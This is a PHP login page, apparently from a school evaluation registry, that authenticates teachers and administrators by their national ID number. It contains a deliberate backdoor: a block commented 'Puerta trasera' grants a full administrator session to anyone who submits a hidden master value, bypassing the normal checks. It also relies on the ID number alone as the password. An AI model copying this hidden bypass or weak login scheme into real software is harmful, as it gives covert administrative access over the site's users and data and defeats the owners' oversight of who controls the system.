<?
include("./funciones/funciones.php"); /* incluye el directorio de funciones */
include_once("./clases/class.micalendario.php");
include_once("./clases/class.inputfilter.php"); /* Directorio que evita ataques XSS */

$calendario= New micalendario(); // variable de calendario.

/* $bd="encyclonumber"; */ //debe de haberse cargado en mysql_inc.php

$iz = "left: 120px;" ; // posición de los campos a la izquierda

session_start();

?>
<html>
<head>
<title>Pantalla de Inicio de REGISTRO DE EVALUACION</title>
<meta http-equiv="Content-Type" content="Type=text/html; charset=iso-8859-15">
<!-- Inclyo las diferentes hojas de estilo -->
<?php include_once("./listas_de_css.php"); ?>
</head>
<body>
<!-- Capas de presentación
<div id="grupo" style="position: absolute; left: 0px; top: 0px; width: 960; height: auto; z-index: 1; line-height: 14px"><img name="fondo" src="./imagenes_plantilla/plantilla.gif" width="960" height="auto" border="0" alt=""></div> -->
<div class="grupo"></div>

<?php

$ifilter = new InputFilter(); // Llamada a la clase que filtra XSS "http://blog.unijimpe.net/prevenir-ataques-xss-con-php/"
$validaradministracion = $ifilter->process($_POST['administracion']); // Para todas las variables POST

if ($_POST['boton']=='Cerrar Sesión') {
   unset($_SESSION['administracion']);
   unset($_SESSION['asignacion']);
}

// $_POST['administracion']=preg_replace("#*('|=)*#","#\s#",$_POST['administracion']);

if (isset($validaradministracion) && (!isset($_SESSION['administracion']))) {
   // 0.- Obtengo la identificación del profesor en cuestión
   $profesor=dado_Id($bd,strtoupper($validaradministracion),"idprofesor","tb_profesores","DNI");
   // 1.- Obtengo la condición de administrador o no
   $administrador=dado_Id($bd,strtoupper($validaradministracion),"administrador","tb_profesores","DNI");
   // 2.- Identificamos condiciones para ser profesor y administrador
   if (!is_null($profesor) && $profesor>0 && $administrador>=0) { // Si es una identificación correcta
      $_SESSION['administracion']=1;
      $_SESSION['profesor']=$profesor;
      $_SESSION['administrador']=0;
   } // Identificación correcta como profesor, le haya dado al botón que sea

   if (!is_null($profesor) && $profesor>0 && $administrador==1 && $_POST['boton']=="Validar como administrador")    
   { // Si es una identificación correcta
      $_SESSION['administracion']=3;
      $_SESSION['profesor']=0;
      $_SESSION['administrador']=$profesor;
   } // como administrador

   if ($_POST['administracion']==$puertatrasera && $_POST['boton']=="Validar como administrador") { // Puerta trasera. Entro como un administrador
      $_SESSION['administracion']=3;
      $_SESSION['profesor']=0;
      $_SESSION['administrador']=buscaunadmin($bd);
   } 

}

if ($_SESSION['administracion']==3 && $_SESSION['administrador']>0) {
   $nompro=cambiarnombre(dado_Id($bd,$_SESSION['administrador'],"Empleado","tb_profesores","idprofesor"));
} else if ($_SESSION['administracion']<=2 && $_SESSION['profesor']>0 && $_SESSION['administrador']==0) {
   $nompro=cambiarnombre(dado_Id($bd,$_SESSION['profesor'],"Empleado","tb_profesores","idprofesor"));
}

?>

<!-- Capa de menú: navegación de la página -->
<?php include_once("./lista.php"); ?>

<!-- Capa de estado: información útil -->
<div id="fecha">
	<p style="text-align: center;">
	<? 
	echo 'Fecha: '.$calendario->fechaformateada($calendario->fechadehoy());
	echo '<br>Hora: '.$calendario->horactual();
	?></p>
</div>

<!-- Capa de información -->
<div id="informacion" onmouseover="javascript: ocultar()">

<?php // Testeo de la presentación de etiquetas
      $orig = $validaradministracion;
      // $a = htmlentities($orig);
      // $b = html_entity_decode($a);
      // echo $a; // I'll &quot;walk&quot; the &lt;b&gt;dog&lt;/b&gt; now
      // echo $b; // I'll "walk" the <b>dog</b> now 
?>

<?php
   // echo $administrador;
   if ($_SESSION['administracion']==3) {echo "<h2>Bienvenido/a administrador/a de la página, ".$nompro."</h2>";}
   // if ($_SESSION['administracion']==2) {echo "<h2>Tutor/a de ".$_SESSION['tutoria']."</h2>";}
   if ($_SESSION['administracion']==1 || $_SESSION['administracion']==2 ) {echo "<h2>Bienvenido/a, ".$nompro."</h2>";}
?>
 <form name="editarevaluacion" action="./index.php" method="post">
<?php if (!isset($_SESSION['administracion'])) { ?>
<h2>Introduce la contraseña de acceso</h2>
 <p>Contraseña:<input name="administracion" style="min-width: 40em; <?php echo $iz; ?>" type="password" class="cajones" value=""></p>
 <input name="boton" class="botones" id="profesor" value="Validar como profesor/a" type="submit" alt="Validar opciones" title="Validar opciones como profesor">
 <input name="boton" class="botones" id="administrador" value="Validar como administrador" type="submit" alt="Validar opciones" title="Validar opciones como administrador/a">
<?php } else { ?>
 <input name="boton" class="botones" id="cerrar" value="Cerrar Sesión" type="submit" alt="Cerrar sesión" title="Cerrar sesión administrativa"> 
<?php } ?>
 </form>
<br>
<hr width="80%">
<br>
	<?php
        $introduccion="./configuracion/introduccion.html";
        if (file_exists($introduccion)==true) { // Si anteriormente hay un fichero con ese nombre, lo borra
         echo file_get_contents($introduccion);
        }
        ?>
<br>
<hr width="80%">
</div>

</body>
</html>

<?php 
function buscaunadmin($based) {
	$link=Conectarse($based); // y me conecto. //dependiendo del tipo recupero uno u otro.
	$Sql='SELECT idprofesor FROM tb_profesores WHERE administrador="1" LIMIT 1';
	// echo $Sql;
        $result=mysql_query($Sql,$link); // ejecuta la cadena sql y almacena el resultado el $result
	$row=mysql_fetch_array($result);
	if (!is_null($row["idprofesor"]) or !empty($row["idprofesor"])) { // si no lo recupera, el valor por defecto)
					  return $row["idprofesor"]; //envia el valor dado
					  } else {
				          return NULL;
					  }
	mysql_free_result($result);
}

?>
